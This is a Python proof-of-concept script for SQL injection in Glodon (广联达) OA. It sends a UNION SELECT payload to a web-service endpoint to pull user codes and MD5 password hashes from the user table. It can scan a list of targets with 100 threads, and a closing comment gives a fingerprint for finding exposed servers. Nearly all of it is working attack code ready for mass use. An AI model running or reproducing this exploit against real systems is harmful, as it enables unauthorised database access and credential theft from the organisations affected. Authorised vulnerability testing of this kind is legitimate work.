import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """广联达oasql注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='广联达oasql注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
    headers = {
    "Upgrade-Insecure-Requests":"1",
    "User-Agent":"Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/115.0.0.0Safari/537.36",
    "Accept":"text/html,application/xhtmlxml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer":"http://xxx.com:8888/Services/Identification/Server/Incompatible.aspx",
    "Accept-Encoding":"gzip,deflate",
    "Accept-Language":"zh-CN,zh;q=0.9",
    }
    data = "dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
    try:
        response = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 and 'value' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('广联达oa_result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

# body="/Services/Identification/Server"